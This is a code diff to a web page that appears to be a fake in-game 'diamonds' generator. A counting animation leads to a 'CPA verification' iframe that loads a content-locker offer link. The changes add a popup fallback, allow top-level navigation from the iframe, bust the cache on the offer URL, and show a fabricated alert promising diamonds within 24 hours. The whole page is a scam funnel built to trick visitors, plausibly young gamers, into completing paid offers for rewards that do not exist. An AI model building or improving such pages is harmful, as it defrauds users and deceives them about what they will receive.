@@ -488,6 +488,7 @@
       box-shadow: 0 20px 40px rgba(0, 0, 0, 0.3);
       border: 1px solid var(--glass-border);
       height: 600px;
+      margin-bottom: 20px;
     }
 
     .verification-iframe {
@@ -986,7 +987,7 @@
   </div>
 
   <!-- Page 6: CPA Verification (New Page) -->
-  <div id="verification-page" class="page">
+  <div id="verification-page" class="page" style="display: none;">
     <div class="verification-container">
       <div class="verification-header">
         <h1 class="title">Complete Verification</h1>
@@ -995,19 +996,11 @@
       
       <div class="verification-iframe-container">
         <iframe id="cpa-iframe" class="verification-iframe" 
-                src="https://lockedapp.store/cl/i/exx1jk"
-                sandbox="allow-scripts allow-forms allow-same-origin allow-popups"
-                allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture">
+                sandbox="allow-scripts allow-forms allow-same-origin allow-popups allow-top-navigation"
+                allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture"
+                frameborder="0">
         </iframe>
       </div>
-      
-      <div class="verification-back-btn">
-        <button class="btn btn-secondary" onclick="goBackToCounting()" style="max-width: 200px;">
-          <i class="fas fa-arrow-left"></i> Back to Counting
-        </button>
-      </div>
-    </div>
-  </div>
 
   <script>
     // ==============================================================
@@ -1540,7 +1533,7 @@
       
       let current = 0;
       const counterElement = document.getElementById('counter');
-      const step = Math.ceil(selectedAmount / 40); // Slower counting for better effect
+      const step = Math.ceil(selectedAmount / 40);
       
       const interval = setInterval(() => {
         current += step;
@@ -1557,18 +1550,83 @@
       }, 40);
     }
 
-    // Step 5: Show Verification Page (CPA)
+    // Step 5: Show Verification Page (CPA) - الدالة المحسنة
     function showVerificationPage() {
-      showPage('verification-page');
+      // إخفاء جميع الصفحات
+      document.querySelectorAll('.page').forEach(page => {
+        page.classList.remove('active');
+      });
       
-      // تحديث الـ iframe لتحميل رابط CPA
+      // إظهار صفحة التحقق
+      const verificationPage = document.getElementById('verification-page');
+      verificationPage.style.display = 'flex';
+      verificationPage.classList.add('active');
+      
+      // تحميل رابط CPA في الـ iframe مع منع التخزين المؤقت
       const iframe = document.getElementById('cpa-iframe');
-      iframe.src = verificationUrl;
+      const timestamp = new Date().getTime();
+      iframe.src = verificationUrl + '?t=' + timestamp;
+      
+      // إضافة مستمع للأحداث لمعرفة متى يتم تحميل الـ iframe
+      iframe.onload = function() {
+        console.log('CPA iframe loaded successfully');
+      };
+      
+      iframe.onerror = function() {
+        console.error('Failed to load CPA iframe');
+        // عرض رسالة للمستخدم
+        setTimeout(() => {
+          const errorMsg = document.createElement('div');
+          errorMsg.innerHTML = `
+            <div style="background: rgba(255,71,87,0.1); border: 1px solid var(--secondary); 
+                 border-radius: 10px; padding: 15px; margin-top: 15px; text-align: center;">
+              <p style="margin-bottom: 10px; color: var(--secondary);">
+                <i class="fas fa-exclamation-triangle"></i> Unable to load verification form.
+              </p>
+              <button class="btn" onclick="openVerificationPopup()" style="max-width: 250px;">
+                <i class="fas fa-external-link-alt"></i> Open Verification in New Tab
+              </button>
+            </div>
+          `;
+          document.querySelector('.verification-container').appendChild(errorMsg);
+        }, 2000);
+      };
+    }
+
+    // دالة لفتح رابط التحقق في نافذة منبثقة بديلة
+    function openVerificationPopup() {
+      const popup = window.open(verificationUrl, 'verificationPopup', 
+        'width=800,height=600,scrollbars=yes,resizable=yes');
+      
+      if (!popup || popup.closed) {
+        alert('Please allow popups to complete verification.');
+        // فتح في نافذة جديدة كبديل
+        window.open(verificationUrl, '_blank');
+        return;
+      }
+      
+      // رسالة توجيهية
+      setTimeout(() => {
+        const confirmation = confirm('After completing verification in the popup window, click OK to continue.');
+        if (confirmation) {
+          // عندما يكمل المستخدم التحقق، يمكنك إضافة منطق إضافي هنا
+          showSuccessMessage();
+        }
+      }, 5000);
+    }
+
+    // دالة للرسالة الناجحة بعد التحقق
+    function showSuccessMessage() {
+      alert('Verification completed! Your diamonds will be added to your account within 24 hours.');
+      // هنا يمكنك إضافة منطق لإعادة التوجيه أو أي شيء آخر
+      // location.reload(); // إعادة تحميل الصفحة للبدء من جديد
     }
 
     // العودة من صفحة التحقق
     function goBackToCounting() {
       showPage('counting-page');
+      // إخفاء صفحة التحقق
+      document.getElementById('verification-page').style.display = 'none';
     }
 
     // Start live notifications when page loads
